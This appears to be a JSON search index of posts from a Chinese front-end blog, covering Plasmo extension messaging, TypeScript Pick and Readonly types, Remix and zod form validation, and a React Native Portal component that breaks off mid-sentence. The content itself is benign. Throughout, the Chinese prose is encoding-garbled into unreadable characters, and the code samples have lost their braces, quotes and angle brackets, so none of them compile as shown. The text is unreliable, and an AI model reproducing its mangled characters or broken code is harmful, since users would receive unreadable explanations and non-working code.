content.tsæˆ–è€…contents.ts background service worker æ˜¯ä¸€ç§åå°æœåŠ¡ï¼Œå®ƒå¯ä»¥å¤„ç†ä¸€äº›é•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡ï¼Œä¾‹å¦‚ä¸‹è½½æ–‡ä»¶ã€ç¼“å­˜æ•°æ®ã€æ¨é€é€šçŸ¥ç­‰ã€‚è¿™ç§æ–¹å¼å¯ä»¥èŠ‚çœå†…å­˜ï¼Œæé«˜ç”¨æˆ·ä½“éªŒæ€§ï¼ŒåŒæ—¶åœ¨ç¦»çº¿çŠ¶æ€ä¸‹ï¼Œä¾ç„¶èƒ½æä¾›ä¸€äº›ç¦»çº¿æœåŠ¡æ¯ä¸ª tab ä¸‹éƒ½ä¼šæœ‰ä¸€ä¸ªç‹¬ç«‹çš„ background service workerã€‚è¿™æ˜¯å› ä¸ºæ¯ä¸ª tab éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æµè§ˆå™¨çª—å£ï¼Œè€Œ service worker åªèƒ½åœ¨åå°è¿è¡Œï¼Œä¸èƒ½ç›´æ¥ä¸ç½‘é¡µçš„å†…å®¹ç›´æ¥è¿›è¡Œäº¤äº’ background.tsæˆ–background.ts é€šä¿¡ MessagePlasm æä¾›çš„ Message API ä¾¿äºåœ¨å„ä¸ªç»„ä»¶ä¹‹é—´çš„æ¶ˆæ¯çš„å‘é€ï¼Œä¸­ç»§ä»¥åŠæ¥æ”¶ã€‚å®˜æ–¹æ–‡æ¡£ä»‹ç»å…¶ API æ˜¯å£°æ˜å¼ï¼Œç±»å‹å®‰å…¨ï¼Œå‡½æ•°å¼ä»¥åŠåŸºäº Promiseï¼Œç›¸æ¯”äºæˆ‘ä»¬è‡ªå·±å°è£…ï¼ŒPlasm æä¾›çš„ API æ›´åŠ çš„å®Œå–„ã€‚ Plasm å°† Message API å°è£…åˆ°ä¸€ä¸ªå•ç‹¬çš„ package ä¸­ï¼Œä½¿ç”¨ä¹‹å‰éœ€è¦å®‰è£…ï¼š pnpm install @plasmohq/messaging Message API çš„åˆ†ç±»å¦‚ä¸‹ï¼š ä¸‹è¡¨ä¸­çš„å•è¯ç¼©å†™å¦‚ä¸‹ï¼š Extension Pages - Ext-Pages Content Scripts - CS Background Service Worker - BGSW Messaging API From To One-time Long-lived Message Flow Ext-PagesCS BGSW Yes No Relay Flow Website CSBGSW Yes No Ports Ext-PagesCS BGSW No Yes Ports BGSW Ext-PagesCS No Yes Ports + Relay BGSW WebPage Yes Yes Message FlowMessage Flow éå¸¸é€‚åˆ extension pagesï¼Œtab pages æˆ–è€… content scripts ç­‰å‰å°å’Œ background service worker åå°æœåŠ¡çš„ä¸€æ¬¡æ€§é€šä¿¡ã€‚åœ¨å°†ä¸€äº›ç¹é‡çš„å·¥ä½œæ‰”ç»™åå°å¤„ç†å’Œç»•è¿‡ CORS æ—¶ç”¨æ­¤é€šä¿¡æ–¹å¼å°±éå¸¸åˆé€‚ã€‚ å…·ä½“ä½¿ç”¨æ–¹æ³•è§å®˜æ–¹æ–‡æ¡£è¯¥ä½ç½®ï¼Œè¿™é‡Œä¸è¿‡å¤šä»‹ç» Relay Flow è¯¥ API è¿˜ä¸å¤ªç¨³å®šï¼Œè°¨æ…ä½¿ç”¨ çœ‹æ–‡æ¡£ä»‹ç»è¯¥ API ç”¨äº target webpage å’Œ background service worker ä¹‹é—´çš„é€šä¿¡ï¼Œå¬ç€å’Œä¸Šé¢çš„ Message Flow å¾ˆåƒã€‚ ä½†æ˜¯ç ”ç©¶ä¸‹å®˜æ–¹çš„ç¤ºä¾‹ï¼Œå‘ç° Relay Flow å’Œ Message Flow çš„ä½œç”¨æˆªç„¶ä¸åŒã€‚ç®€å•æ¥è¯´ï¼Œå¦‚æœ target webpage ä¹Ÿæ˜¯ä½ å¼€å‘çš„ï¼Œå¹¶ä¸”éœ€è¦å°† message ä¼ é€’åˆ°é…å¥—çš„æ’ä»¶ background service worker é‡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥å°† content scripts ä½œä¸ºä¸­è½¬ï¼Œå®Œæˆæ¶ˆæ¯çš„å‘é€ã€‚ è¯¥ API çš„ä½¿ç”¨åœºæ™¯è¿˜æ˜¯æ¯”è¾ƒå±€é™çš„ï¼Œä½†æ˜¯åœ¨æŸäº›åœºæ™¯ä¸‹å¯èƒ½ä¼šæœ‰å¥‡æ•ˆã€‚ å…·ä½“ä½¿ç”¨æ–¹æ³•è§å®˜æ–¹æ–‡æ¡£è¯¥ä½ç½®ï¼Œè¿™é‡Œä¸è¿‡å¤šä»‹ç» Ports è¯¥ API è¿˜ä¸å¤ªç¨³å®šï¼Œè°¨æ…ä½¿ç”¨ Messaging Ports API æ˜¯å¯¹æ’ä»¶åŸç”Ÿçš„ port API çš„æŠ½è±¡ï¼Œä¸»è¦ç”¨äºå’Œ background service worker å»ºç«‹é•¿é“¾æ¥ã€‚ å…·ä½“ä½¿ç”¨æ–¹æ³•è§å®˜æ–¹æ–‡æ¡£è¯¥ä½ç½®ï¼Œè¿™é‡Œä¸è¿‡å¤šä»‹ç» å­˜å‚¨ Storageç¯å¢ƒå˜é‡ Environment Variables"},{"title":"TS ä¸­å¸¸è§å·¥å…·ç±»å‹çš„ä½¿ç”¨åŠå®ç°","path":"/2023/06/05/4ff7282e236f/","content":"PickType, Keys ä½œç”¨ï¼š ä» Type é€‰æ‹©ä¸€ç»„ Keys å±æ€§ ä½¿ç”¨ï¼š export interface Todo remark: string; required: boolean; hobby: string[];const A: PickTodo, remark | required = remark: 111, required: false,;// è¡¨ç¤ºAåªèƒ½æœ‰ remarkã€required å®ç°ï¼š type PickT, K extends keyof T = [P in K]: T[P];;// K extends keyof T,è¿™å¥è¡¨ç¤ºï¼Œç¡®ä¿ K æ˜¯ T çš„å­é›†// keyof: å– interface çš„é”®åä¿å­˜ä¸ºè”åˆç±»å‹// in: å–è”åˆç±»å‹çš„å€¼ï¼Œä¸»è¦ç”¨äºæ•°ç»„å’Œå¯¹è±¡çš„æ„å»º// ç”¨äºå®é™…å¼€å‘ï¼Œä¸¾ä¸ªä¾‹å­ï¼š// function getValue(o:object, key: string)// return o[key]// // const obj1 = name: å¼ ä¸‰, age: 18 // const values = getValue(obj1, name)// è¿™æ ·å†™ä¸§å¤±äº† ts çš„ä¼˜åŠ¿ï¼š// æ— æ³•ç¡®å®šè¿”å›å€¼ç±»å‹// æ— æ³•å¯¹keyè¿›è¡Œçº¦æŸ// function getValueT extends Object,K extends keyof T(o: T,key: K): T[K] // return o[key]// // const obj1 = name: å¼ ä¸‰ï¼Œ age: 18// const values = getValue(obj1, name)// å¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸æ˜¯ obj1 ä¸­çš„å‚æ•°å°±ä¼šæŠ¥é”™ Readonly ä½œç”¨ï¼šè¯¥ Readonly ä¼šæ¥æ”¶ä¸€ä¸ª æ³›å‹å‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„ç±»å‹ï¼Œåªæ˜¯æ‰€æœ‰å±æ€§éƒ½ä¼šè¢« readonly æ‰€ä¿®é¥°ã€‚ä¹Ÿå°±æ˜¯ä¸å¯ä»¥å†å¯¹è¯¥å¯¹è±¡çš„å±æ€§èµ‹å€¼ã€‚ ä½¿ç”¨ï¼š interface Todo title: string; description: string;const todo: ReadonlyTodo = title: Hey, description: foobar,;todo.title = Hello; // Error: cannot reassign a readonly propertytodo.description = barFoo; // Error: cannot reassign a readonly property å®ç°ï¼š type ReadonlyT = readonly [P in keyof T]: T[P];;// readonlyä¿®é¥°ç¬¦ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªå…³é”®å­—// å¯¹ç±»ä¸­çš„å±æ€§æˆå‘˜è¿›è¡Œä¿®é¥°ï¼Œä¿®é¥°ä¹‹åï¼Œè¯¥å±æ€§æˆå‘˜å°±ä¸èƒ½ä¿®æ”¹äº†ï¼Œåªèƒ½å¤Ÿè¿›è¡Œè®¿é—®","tags":["Typescript"],"categories":["Typescript"]},{"title":"Remix - è¡¨å•&æ¥å£å…¥å‚æ ¡éªŒ","path":"/2023/04/18/40fc3d9c3a91/","content":"å‰è¨€Remix æ˜¯ React Router å›¢é˜Ÿå¼€å‘çš„åŸºäº React æ¡†æ¶çš„å…¨æ ˆ Web æ¡†æ¶ã€‚æ—¢ç„¶æ˜¯åŸºäº React æ¡†æ¶ï¼Œé‚£ä¹ˆåœ¨ React ä¸­èƒ½å¤Ÿä½¿ç”¨çš„è¡¨å•æ ¡éªŒæ–¹æ¡ˆï¼ŒåŒæ ·é€‚ç”¨äº Remixã€‚ Remix ä¸­çš„å®¢æˆ·ç«¯è¡¨å•æ ¡éªŒå¯ä»¥é‡‡ç”¨ React çš„è¡¨å•æ ¡éªŒæ–¹æ¡ˆï¼Œä½†æ˜¯ Remix ä½œä¸ºä¸€ä¸ªå…¨æ ˆæ¡†æ¶ï¼Œè‡ªç„¶æ˜¯æœ‰æœåŠ¡ç«¯æ¥å£çš„ï¼Œé‚£ä¹ˆå…¶å…¥å‚æ ¡éªŒä¹Ÿæ˜¯å¦å¯ä»¥é‡‡ç”¨ node åç«¯é€šç”¨çš„å‚æ•°æ ¡éªŒæ–¹æ¡ˆï¼Ÿ ä¸‹é¢æˆ‘ä»¬å°±çœ‹çœ‹åœ¨å‰åç«¯éƒ½æ˜¯æ€ä¹ˆæ ¡éªŒå‚æ•°çš„ React è¡¨å•æ ¡éªŒæ¡†æ¶å†…ç½®æ ¡éªŒç”¨è¿‡ React ç»„ä»¶åº“åŒå­¦åº”è¯¥éƒ½çŸ¥é“ï¼Œè¿™äº›ç»„ä»¶åº“å†…éƒ¨ä¸€èˆ¬éƒ½ä¼šå†…ç½®ä¸€ä¸ªè¡¨å•æ ¡éªŒæ¨¡å—ï¼Œä¾‹å¦‚ Ant Design ï¼š import React from react;import Button, Checkbox, Form, Input from antd;const onFinish = (values: any) = console.log(Success:, values);;const onFinishFailed = (errorInfo: any) = console.log(Failed:, errorInfo);;const App: React.FC = () = ( Form name=basic labelCol= span: 8 wrapperCol= span: 16 style= maxWidth: 600 initialValues= remember: true onFinish=onFinish onFinishFailed=onFinishFailed autoComplete=off Form.Item label=Username name=username rules=[ required: true, message: Please input your username! ] Input / /Form.Item Form.Item label=Password name=password rules=[ required: true, message: Please input your password! ] Input.Password / /Form.Item Form.Item name=remember valuePropName=checked wrapperCol= offset: 8, span: 16 CheckboxRemember me/Checkbox /Form.Item Form.Item wrapperCol= offset: 8, span: 16 Button type=primary htmlType=submit Submit /Button /Form.Item /Form);export default App; ç‹¬ç«‹æ ¡éªŒæ¨¡å—è„±ç¦»ç»„ä»¶åº“æ¡†æ¶åï¼Œå‰ç«¯ç¤¾åŒºé‡Œè¿˜æ˜¯æœ‰å¾ˆå¤šå¯é€‰çš„æ ¡éªŒæ¨¡å—ï¼Œè¿™é‡Œæˆ‘åªä»‹ç»ä¸¤ä¸ªæˆ‘ä½¿ç”¨è¿‡å¹¶ä¸”ç»å¯¹ç‰¹åˆ«å¥½ç”¨çš„åº“ï¼š react-hook-formä»åå­—ä¸­å°±èƒ½çœ‹å‡ºï¼Œè¿™ä¸ªåº“ä¸»è¦é€‚ç”¨äº React æ¡†æ¶ï¼Œå› æ­¤ç”¨åŸç”Ÿå¼€å‘æ—¶éœ€è¦æ ¡éªŒè¡¨å•å¼ºçƒˆæ¨èè¯¥åº“ï¼Œå¹¶ä¸”å…¶ä¹Ÿèƒ½å¾ˆå¥½çš„èå…¥ç°æœ‰ç»„ä»¶åº“ã€‚ import useForm from react-hook-form;export default function App() const register, handleSubmit, watch, formState: errors = useForm(); const onSubmit = data = console.log(data); console.log(watch(example)); // watch input value by passing the name of it return ( /* handleSubmit will validate your inputs before invoking onSubmit */ form onSubmit=handleSubmit(onSubmit) /* register your input into the hook by invoking the register function */ input defaultValue=test ...register(example) / /* include validation with required or other standard HTML validation rules */ input ...register(exampleRequired, required: true ) / /* errors will return when field validation fails */ errors.exampleRequired spanThis field is required/span input type=submit / /form ); Zod è¿™ä¸ªåº“å°±æ˜¯ä¸ªçº¯ç²¹çš„å­—æ®µæ ¡éªŒçš„åº“äº†ï¼Œæ­£æ˜¯å› ä¸ºçº¯ç²¹ï¼Œç¤¾åŒºä¸ºå…¶å¼€å‘äº†å„ç§é€‚é…å™¨ï¼Œå¯ä»¥å°† zod åº”ç”¨åˆ°ä»»ä½•éœ€è¦å­—æ®µæ ¡éªŒçš„åœ°æ–¹ï¼Œä¸‹é¢çœ‹ä¸‹ zod å¦‚ä½•åº”ç”¨åœ¨ React è¡¨å•æ ¡éªŒï¼š import z from zod;import useZorm from react-zorm;const FormSchema = z.object( name: z.string().min(1), password: z .string() .min(10) .refine((pw) = /[0-9]/.test(pw), Password must contain a number),);function Signup() const zo = useZorm(signup, FormSchema, onValidSubmit(e) e.preventDefault(); alert(Form ok! + JSON.stringify(e.data, null, 2)); , ); const disabled = zo.validation?.success === false; return ( form ref=zo.ref Name: input type=text name=zo.fields.name() className=zo.errors.name(errored) / zo.errors.name((e) = ( ErrorMessage message=e.message / )) Password: input type=password name=zo.fields.password() className=zo.errors.password(errored) / zo.errors.password((e) = ( ErrorMessage message=e.message / )) button disabled=disabled type=submit Signup! /button preValidation status: JSON.stringify(zo.validation, null, 2)/pre /form ); æœåŠ¡ç«¯æ¥å£å…¥å‚æ ¡éªŒåœ¨æœåŠ¡ç«¯æ ¡éªŒå…¥å‚æœ¬è´¨ä¸Šå°±æ˜¯æ ¡éªŒå­—æ®µï¼Œé‚£ä¹ˆå…ˆçœ‹ä¸‹å…¶å®ƒçš„ node æœåŠ¡ç«¯æ¡†æ¶éƒ½æ˜¯æ€ä¹ˆæ ¡éªŒå‚æ•°çš„ï¼š Egg Egg ä½¿ç”¨ egg-validate æ¨¡å—è¿›è¡Œå‚æ•°æ ¡éªŒï¼ŒåŸºæœ¬ç”¨æ³•å¦‚ä¸‹ï¼š class XXXController extends app.Controller // ... async XXX() const ctx = this; ctx.validate( system : type: string, required: false, defValue: account, desc: ç³»ç»Ÿåç§°, token : type: string, required: true, desc: token éªŒè¯, redirect: type: string, required: false, desc: ç™»å½•è·³è½¬ ); // if (config.throwError === false) if(ctx.paramErrors) // get error infos from `ctx.paramErrors`; let params = ctx.params; let query, body = ctx.request; // ctx.params = validater.ret.params; // ctx.request.query = validater.ret.query; // ctx.request.body = validater.ret.body; // ... ctx.body = query; // ... nestjs nestjs ä¸»è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ class-validator æ¥è¿›è¡Œå‚æ•°æ ¡éªŒã€‚ import Injectable, PipeTransform, ArgumentMetadata, ValidationError, HttpException, HttpStatus from @nestjs/common;import plainToClass from class-transformer;import validate from class-validator;/** * è¿™æ˜¯ä¸€ä¸ªå…¨å±€çš„å‚æ•°éªŒè¯ç®¡é“ï¼ŒåŸºäºclass-transformer * å¦‚æœå¤±è´¥ï¼Œåˆ™ä¼šæŠ›å‡ºHttpException * åœ¨main.tsçš„nestAppè¦å°†å®ƒè®¾ä¸ºå…¨å±€çš„ */@Injectable()export class ValidationPipe implements PipeTransform async transform(value: any, metatype : ArgumentMetadata) if (!metatype || !this.toValidate(metatype)) return value; const object = plainToClass(metatype, value); const errors = await validate(object); const errorList: string[] = []; const errObjList: ValidationError[] = [...errors]; do const e = errObjList.shift(); if (!e) break; if (e.constraints) for (const item in e.constraints) errorList.push(e.constraints[item]); if (e.children) errObjList.push(...e.children); while (true); if (errorList.length 0) throw new HttpException(è¯·æ±‚å‚æ•°æ ¡éªŒé”™è¯¯: + errorList.join(), HttpStatus.INTERNAL_SERVER_ERROR); return object; private toValidate(metatype: Function): boolean const types: Function[] = [String, Boolean, Number, Array, Object]; return !types.includes(metatype); ä»ä¸Šé¢çš„ä¸¤ä¸ªæ¡†æ¶å¯ä»¥çœ‹å‡ºæ¥ï¼Œå¯¹äºå¦‚ä½•è¿›è¡Œå‚æ•°æ ¡éªŒï¼Œå¤§å®¶çš„å¤„ç†è¿‡ç¨‹éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œéƒ½æ˜¯å…ˆå®šä¹‰ä¸€å¥—è§„åˆ™ï¼Œç„¶åç”¨è¿™å¥—è§„åˆ™å»æ ¡éªŒå­—æ®µã€‚ é‚£ä¹ˆåœ¨ remix ä¸­æ ¡éªŒå…¥å‚è‡ªç„¶ä¹Ÿæ˜¯è¿™ä¸ªæµç¨‹ï¼Œä¸‹é¢çš„ç¤ºä¾‹ä¸­ä¼šä½¿ç”¨ zod æ¥æ ¡éªŒå‚æ•°ï¼š import type ActionArgs from @remix-run/node;import z from zod;import parseFormAny, useZorm from react-zorm;const LoginSchema = z.object( email: z .string( required_error: Email is required ) .email( message: Invalid email ), password: z .string( required_error: Password is required ) .min(8, message: Password must be at least 8 characters ), remember: z.optional(z.boolean()),);export async function action( request : ActionArgs) const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); if (!result.success) return json( errors: result.error , status: 400 ); å‰åç«¯æ ¡éªŒç»Ÿä¸€ä¸Šé¢åˆ†åˆ«ä»‹ç»äº†å¦‚ä½•åœ¨å‰åç«¯æ ¡éªŒå‚æ•°ï¼Œä½†æ˜¯å¦‚æœæ˜¯ä¸€ä¸ªå‰åç«¯åˆ†ç¦»çš„é¡¹ç›®ï¼Œé‚£ä¹ˆå‰åç«¯åˆ†å¼€æ ¡éªŒå¹¶ä¸”ä½¿ç”¨ä¸åŒçš„æ ¡éªŒæ–¹æ¡ˆè‡ªç„¶æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨ remix è¿™ä¹ˆä¸€ä¸ªå…¨æ ˆæ¡†æ¶é‡Œä½¿ç”¨ä¸¤å¥—æ ¡éªŒæ–¹æ¡ˆï¼Œå¤šå°‘æ˜¾å¾—æœ‰äº›å†—ä½™äº†ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å¯¼è‡´å‰åç«¯æ ¡éªŒä¸ä¸€è‡´çš„é—®é¢˜ã€‚ é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ¡ˆï¼Œå¯ä»¥åªå†™ä¸€å¥—æ ¡éªŒè§„åˆ™ï¼ŒåŒæ—¶é€‚ç”¨äºå‰åç«¯å—ï¼Ÿ è‡ªç„¶æ˜¯å¯ä»¥çš„ï¼Œå…¶å®ä¸Šæ–‡å·²ç»ç»™å‡ºäº†ç­”æ¡ˆï¼Œå°±æ˜¯ä½¿ç”¨ zod æ¥æ ¡éªŒå‚æ•°ï¼Œä¸‹é¢ç»™å‡ºä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼š import React from react;import IconBrandGithub, IconBrandTwitter from @tabler/icons-react;import Link, Form from @remix-run/react;import type ActionArgs from @remix-run/node;import json, redirect from @remix-run/node;import parseFormAny, useZorm from react-zorm;import z from zod;import LoginLayout from ~/components/user-layout;import FormInner from ~/components/form/form-inner;import Input from ~/components/input;import Button from ~/components/button;import Checkbox from ~/components/checkbox;import loginUser, setAuthSession from ~/modules/auth;import authCookie from ~/integrations/supabase;const LoginSchema = z.object( email: z .string( required_error: Email is required ) .email( message: Invalid email ), password: z .string( required_error: Password is required ) .min(8, message: Password must be at least 8 characters ), remember: z.optional(z.boolean()),);export async function action( request : ActionArgs) const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); let session = await authCookie.getSession(request.headers.get(Cookie)); if (!result.success) return json( errors: result.error , status: 400 ); const accessToken, refreshToken, error = await loginUser( result.data.email, result.data.password ); if (error || !accessToken || !refreshToken) return json( formError: error || Something went wrong , 403); session = setAuthSession(session, accessToken, refreshToken); return redirect(/, headers: Set-Cookie: await authCookie.commitSession(session), , );const Login: React.FC = () = const zo = useZorm(NewQuestionWizardScreen, LoginSchema); const renderFooter = () = ( div className=hr-textor/div div className=card-body div className=row div className=col Button href=# icon=IconBrandGithub className=text-github / block Login with Github /Button /div div className=col Button href=# icon=IconBrandTwitter className=text-twitter / block Login with Twitter /Button /div /div /div / ); return ( LoginLayout title=Login to your account footer=renderFooter() description= Dont have account yet? Link to=/sign-upSign up/Link / Form ref=zo.ref method=post replace FormInner label=Email address required error=zo.errors.email()?.message Input name=zo.fields.email() type=email placeholder=your@email.com / /FormInner FormInner label=Password required labelSuffix=Link to=/forgot-passwordI forgot password/Link error=zo.errors.password()?.message Input name=zo.fields.password() type=password placeholder=Your password / /FormInner div className=mb-2 Checkbox name=zo.fields.remember() Remember me on this device /Checkbox /div div className=form-footer Button buttonType=submit type=primary block Sign in /Button /div /Form /LoginLayout );;export default Login;","tags":["React","Remix"],"categories":["React","Remix"]},{"title":"React Native ç»„ä»¶åº“ - Portal ç»„ä»¶","path":"/2023/04/02/93b995cb58f9/","content":"React ä¸­çš„ Portal ç»„ä»¶æƒ³å¿…å¯¹ React ç†Ÿæ‚‰çš„åŒå­¦éƒ½ä¸ä¼šé™Œç”Ÿï¼Œå®ƒæä¾›äº†ä¸€ç§å°†å­èŠ‚ç‚¹è„±ç¦»çˆ¶èŠ‚ç‚¹æ¸²æŸ“åˆ°å…¶å®ƒ DOM èŠ‚ç‚¹çš„æ–¹æ¡ˆã€‚ createPortal æ–‡æ¡£ï¼šhttps://react.dev/reference/react-dom/createPortal#usage é»˜è®¤ä¸‹æƒ…å†µä¸‹ JSX ä¸­çš„å…ƒç´ é¡ºåºå°±æ˜¯å…¶æ¸²æŸ“åˆ°çœŸå® DOM çš„é¡ºåºï¼š function MyComponent() return ( div style= border: 2px solid black pThis child is placed in the parent div./p pThis child is placed in the document body./p /div ); æ¸²æŸ“åçš„ DOM ç»“æ„å¦‚ä¸‹ï¼š body div id=root ... div style=border: 2px solid black pThis child is placed inside the parent div./p pThis child is placed in the document body./p /div ... /div/body ä½¿ç”¨ createPortal å import createPortal from react-dom;function MyComponent() return ( div style= border: 2px solid black pThis child is placed in the parent div./p createPortal( pThis child is placed in the document body./p, document.body ) /div ); p è¡¨å•è™½ç„¶è¿˜åœ¨ div æ ‡ç­¾é‡Œï¼Œä½†æ˜¯æœ€ç»ˆæ¸²æŸ“åˆ° DOM åå´åœ¨ document.body é‡Œï¼š body div id=root ... div style=border: 2px solid black pThis child is placed inside the parent div./p /div ... /div pThis child is placed in the document body./p/body createPortal å› ä¸ºå…¶è„±ç¦»çˆ¶å…ƒç´ çš„ç‰¹æ€§ï¼Œæœ€å¸¸è§çš„åœºæ™¯å°±æ˜¯ Modalï¼ŒDrawer ç­‰ç»„ä»¶ï¼Œä»¥ Ant Design ä¸¾ä¾‹ï¼š import React, useState from react;import Button, Modal from antd;const App: React.FC = () = const [isModalOpen, setIsModalOpen] = useState(false); const showModal = () = setIsModalOpen(true); ; const handleOk = () = setIsModalOpen(false); ; const handleCancel = () = setIsModalOpen(false); ; return ( Button type=primary onClick=showModal Open Modal /Button Modal title=Basic Modal open=isModalOpen onOk=handleOk onCancel=handleCancel pSome contents.../p pSome contents.../p pSome contents.../p /Modal / );;export default App; åœ¨ JSX ä¸­ Button å’Œ Modal è™½ç„¶æ˜¯åœ¨åŒä¸€çº§ï¼Œä½†æ˜¯åœ¨æ¸²æŸ“åˆ°çœŸå® dom åï¼ŒModal å´æ˜¯æ¸²æŸ“æˆ body çš„ç›´æ¥å­å…ƒç´ ï¼š ä¸ºä»€ä¹ˆéœ€è¦ Portal ç»„ä»¶è¿™æ˜¯å› ä¸ºæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°éœ€è¦ç®¡ç†ç»„ä»¶å±‚çº§çš„æƒ…å†µï¼Œæœ€å¸¸è§çš„å°±æ˜¯é¡µé¢å‡ºç°å¤šä¸ª Modalï¼Œå¦‚ä½•ç®¡ç†è¿™äº› Modal å°±æ˜¯ä¸ªå¾ˆå¤æ‚çš„é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªæˆ‘ä»¬ä¸€èˆ¬ä¼šæƒ³åˆ°ç”¨ z-index è°ƒæ•´ç»„ä»¶çš„å±‚çº§ï¼Œé¦–å…ˆä¸ææ‰‹åŠ¨ç®¡ç† z-index åˆä¸åˆç†ï¼Œå°±æ˜¯ z-index æœ¬èº«ä¹Ÿä¸èƒ½é€‚ç”¨æ‰€æœ‰åœºæ™¯ï¼Œå®ƒä¹Ÿæ˜¯æœ‰å±€é™æ€§çš„ï¼š å¿…é¡»æ˜¯ä¸€ä¸ªå®šä½çš„ï¼ˆå³å…¶ position å±æ€§å€¼ä¸æ˜¯ staticï¼‰è„±ç¦»äº†æ–‡æ¡£æµçš„å…ƒç´ ï¼Œz-index æ‰èƒ½ç”Ÿæ•ˆ z-index ä¸ä¸€å®šæ˜¯å€¼è¶Šå¤§è¶Šé å‰ã€‚å®é™…ä¸Šåœ¨ CSS ä¸­å…ƒç´ çš„å±‚çº§æ˜¯ç”±å±‚å ä¸Šä¸‹æ–‡å†³å®šçš„ï¼Œz-index åªåœ¨åŒä¸€ä¸ªå±‚å ä¸Šä¸‹æ–‡ä¸­æ¯”è¾ƒæ‰æœ‰æ„ä¹‰ï¼Œå°±åƒçœé•¿çš„ç§˜ä¹¦å’Œå¸‚é•¿çš„ç§˜ä¹¦ï¼Œè™½ç„¶éƒ½æ˜¯ç§˜ä¹¦ï¼Œä½†æ˜¯è¿™æœ‰å¯æ¯”æ€§å—ã€‚çœ‹ä»¥ä¸‹ä»£ç ï¼š div style=position:relative; z-index:auto; img src=mm1.jpg style=position:absolute; z-index:2; / -- æ¨ªå¦¹å­ --/divdiv style=position:relative; z-index:auto; img src=mm2.jpg style=position:relative; z-index:1; / -- ç«–å¦¹å­ --/div æ¨ªå¦¹å­ ä¼šç›–åœ¨ ç«–å¦¹å­èº«ä¸Šï¼Œè¿™æ˜¯å› æ­¤ä¸¤ä¸ª img çš„çˆ¶çº§åœ¨åŒä¸€å±‚å ä¸Šä¸‹æ–‡ä¸­ï¼Œè¿™æ˜¯ z-index çš„å¤§å°æ¯”è¾ƒå°±æœ‰äº†æ„ä¹‰ã€‚ ç®€å•ä¿®æ”¹ä¸‹ï¼Œå°† z-index:autoæ”¹æˆ z-index:0ï¼Œè¿™æ—¶ä¸¤å¼ å›¾ç‰‡çš„å±‚çº§å°±å‘ç”Ÿäº†é¢ å€’ï¼š div style=position:relative; z-index:0; img src=mm1.jpg style=position:absolute; z-index:2; / -- æ¨ªå¦¹å­ --/divdiv style=position:relative; z-index:0; img src=mm2.jpg style=position:relative; z-index:1; / -- ç«–å¦¹å­ --/div è¿™æ˜¯å› ä¸º z-index:0åˆ›å»ºäº†ä¸€ä¸ªå±‚çº§ä¸Šä¸‹æ–‡ï¼Œè¿™æ—¶ä¸¤ä¸ª img ä¼šå…ˆæ¯”è¾ƒçˆ¶å…ƒç´ çš„å±‚çº§ï¼Œè€Œç”±äºä¸¤è€…çš„å±‚å é¡ºåºä¸€æ ·ï¼Œä¼šæŒ‰ç…§ DOM æµçš„é¡ºåºæ¯”è¾ƒå±‚çº§å¤§å°ï¼Œè‡ªç„¶æ˜¯åé¢çš„ ç«–å¦¹å­ è¦†ç›–åœ¨ æ¨ªå¦¹å­ ä¸Šï¼Œå…¶å®è¿™æ—¶å€™å­å…ƒç´ çš„ z-indexå°±æ˜¯æ‰“é…±æ²¹çš„ï¼Œæ”¹æˆä»»ä½•å€¼éƒ½ä¸ä¼šå½±å“ä»–ä»¬çš„å±‚çº§é¡ºåºã€‚ ä¸æ˜ç™½ä»€ä¹ˆæ˜¯ ã€Œå±‚å ä¸Šä¸‹æ–‡ã€çš„ï¼Œå¯ä»¥çœ‹å¼ é‘«æ—­çš„è¿™ç¯‡æ–‡ç« ï¼šhttps://www.zhangxinxu.com/wordpress/2016/01/understand-css-stacking-context-order-z-index/ è¯è¯´å›æ¥ï¼Œç”¨ z-index æ¥è°ƒæ•´å±‚çº§æœ‰è¿™ä¹ˆå¤šé™åˆ¶ï¼Œè‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ä¸€ä¸ªç®€å•é«˜æ•ˆçš„æ–¹å¼ï¼Œè¿™å°±ä¸å¾—ä¸æ Portal ç»„ä»¶çš„é«˜æ˜ä¹‹å¤„äº†ï¼š ç”±äº Portal ä¼šå°†å­èŠ‚ç‚¹è„±ç¦»çˆ¶èŠ‚ç‚¹æ‰€åœ¨çš„ä¸Šä¸‹æ–‡ï¼Œå¸ƒå±€å°±å¯ä»¥ä¸å—çˆ¶èŠ‚ç‚¹çš„å½±å“ Portal å¯ä»¥å°†å­èŠ‚ç‚¹ç»Ÿä¸€æ’å…¥åˆ° body ä¸­ï¼Œè¿™æ˜¯ä¼šåœ¨åŒä¸€ä¸ªå±‚å ä¸Šä¸‹æ–‡ä¸­ï¼Œå±‚çº§çš„é¡ºåºå–å†³äºåœ¨åœ¨ BOM æµçš„é¡ºåºï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯å–å†³äº Portal æ‰§è¡Œçš„é¡ºåº ä½¿ç”¨ Portal ç»„ä»¶è™½ç„¶ Portal ç‰¹åˆ«è´´åˆæŸäº›ä½¿ç”¨åœºæ™¯ï¼Œä½†æ˜¯ React Native å´æ²¡æœ‰æä¾›åŸç”Ÿçš„ Portal ç»„ä»¶ï¼Œæˆ‘ä»¬åœ¨ React ä¸­å¸¸ç”¨çš„ Portal ç»„ä»¶ï¼Œæ˜¯ react-dom æä¾›çš„ï¼Œå®ƒåªé€‚ç”¨äºæµè§ˆå™¨è¿™æ ·çš„å®¿ä¸»ç¯å¢ƒï¼š import Portal from react-dom; å¾—ç›Šäºå‰ç«¯æ´»è·ƒåˆ°å¤¸å¼ 